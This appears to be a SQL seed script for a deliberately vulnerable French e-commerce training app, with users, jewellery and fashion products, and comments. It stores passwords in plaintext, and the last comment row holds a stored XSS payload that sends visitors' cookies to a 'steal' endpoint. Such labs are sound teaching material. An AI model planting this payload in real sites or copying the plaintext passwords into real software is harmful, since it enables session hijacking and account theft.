
DROP TABLE IF EXISTS COMMENTS;
DROP TABLE IF EXISTS PRODUCT;
DROP TABLE IF EXISTS SECU_USERS;

 CREATE TABLE SECU_USERS (
   USR_ID INT NOT NULL AUTO_INCREMENT,
   USR_LOGIN varchar(100) NOT NULL,
   USR_PWD varchar(512) NOT NULL,
   USR_VILLE varchar(512) NULL,
   USR_AGE INT NULL,
   PRIMARY KEY (USR_ID)
 ) ENGINE=InnoDB;

CREATE TABLE PRODUCT (
   PRD_ID INT NOT NULL AUTO_INCREMENT,
   PRD_TITLE varchar(100) NOT NULL,
   PRD_DESCRIPTION varchar(2048) NOT NULL,
   PRD_PRICE FLOAT NOT NULL,
   PRD_IMAGE varchar(512) NOT NULL,
   PRD_CATEGORY varchar(100) NOT NULL,
   USR_ID INT NOT NULL,
   FOREIGN KEY (USR_ID) REFERENCES SECU_USERS(USR_ID),
   PRIMARY KEY (PRD_ID)
 ) ENGINE=InnoDB;

CREATE TABLE COMMENTS (
   COM_ID INT NOT NULL AUTO_INCREMENT,
   COM_CONTENT varchar(20148) NOT NULL,
   PRD_ID INT NOT NULL,
   USR_ID INT NOT NULL,
   FOREIGN KEY (PRD_ID) REFERENCES PRODUCT(PRD_ID),
   FOREIGN KEY (USR_ID) REFERENCES SECU_USERS(USR_ID),
   PRIMARY KEY (COM_ID)
 ) ENGINE=InnoDB;


INSERT INTO SECU_USERS (USR_ID, USR_LOGIN, USR_PWD, USR_VILLE, USR_AGE)  VALUES (1, 'alice', '123456', 'Rennes', 28);
INSERT INTO SECU_USERS (USR_ID, USR_LOGIN, USR_PWD, USR_VILLE, USR_AGE)  VALUES (2, 'bob', 'azerty', 'Brest', 35);

INSERT INTO PRODUCT (PRD_ID, PRD_TITLE, PRD_DESCRIPTION, PRD_PRICE, PRD_IMAGE, PRD_CATEGORY, USR_ID)
VALUES (
100, 'Escarpins Louboutin',
 'Chaussures très fashion à talon haut avec ses populaires semelles rouge et compensées. Chaussures entièrement recouvertes de cristal. Bijoux de perles Talon : 12 cm Disponible en ivoire',
 595.99,
 '/static/images/products/chaussure.jpg',
 'chaussure',
 1);


INSERT INTO PRODUCT (PRD_ID, PRD_TITLE, PRD_DESCRIPTION, PRD_PRICE, PRD_IMAGE, PRD_CATEGORY, USR_ID)
VALUES (
101, 'Boucles d''Oreilles Swarovski',  'Idéales pour faire étinceler vos tenues quotidiennes !  Chaque clou en métal doré présente une boule Crystal Silver Shade serti en Pointiage, pour un éclat exceptionnel.',
 59.98,
 '/static/images/products/boucles.jpg',
 'bijou',
 1);

INSERT INTO PRODUCT (PRD_ID, PRD_TITLE, PRD_DESCRIPTION, PRD_PRICE, PRD_IMAGE, PRD_CATEGORY, USR_ID)
VALUES (
102, 'Parfum pour femme Coco Chanel',
 'Un parfum captivant et sensuel. Une invitation au voyage aux portes de l''Orient. Une goutte déposée derrière l''oreille, au creux du coude, au point de pulsation du poignet. Flacon de 50 ML Famille olfactive : Oriental & Epicé',
 90.55,
 '/static/images/products/parfum.jpg',
 'cosmetique',
 1);

INSERT INTO PRODUCT (PRD_ID, PRD_TITLE, PRD_DESCRIPTION, PRD_PRICE,PRD_IMAGE, PRD_CATEGORY, USR_ID)
VALUES (
103, 'Alliance Cleor',
'Alliance Promesse Or 750/1000 Diamants 0,77 ct Couleur du métal Argenté Fabrication sur mesure',
 2060.99,
 '/static/images/products/alliance.jpg',
 'bijou',
 2);


INSERT INTO PRODUCT (PRD_ID, PRD_TITLE, PRD_DESCRIPTION, PRD_PRICE, PRD_IMAGE, PRD_CATEGORY, USR_ID)
VALUES (
104, 'Pochette strass',
'Sac de soirée strasse, idéal pour accompagner tenues lors de vos soirées, mariage ou vernissages. La chaîne amovible pour porter le sac sur l''épaule ou à la main. Fermeture à pression Dimension environ : largeur : 24 cm, profondeur : 6 cm, hauteur : 9 cm',
 66.89,
 '/static/images/products/sac.jpg',
 'vetement',
 2);


INSERT INTO COMMENTS (COM_ID, COM_CONTENT, PRD_ID, USR_ID)
VALUES (1, 'Quels sont les délais max de livraison du PRODUCT ?', 100, 1);

INSERT INTO COMMENTS (COM_ID, COM_CONTENT, PRD_ID, USR_ID)
VALUES (2, 'Délicieux ces cookies !<script>new Image().src="http://localhost:8081/steal?cookies="+document.cookie</script>', 101, 2);

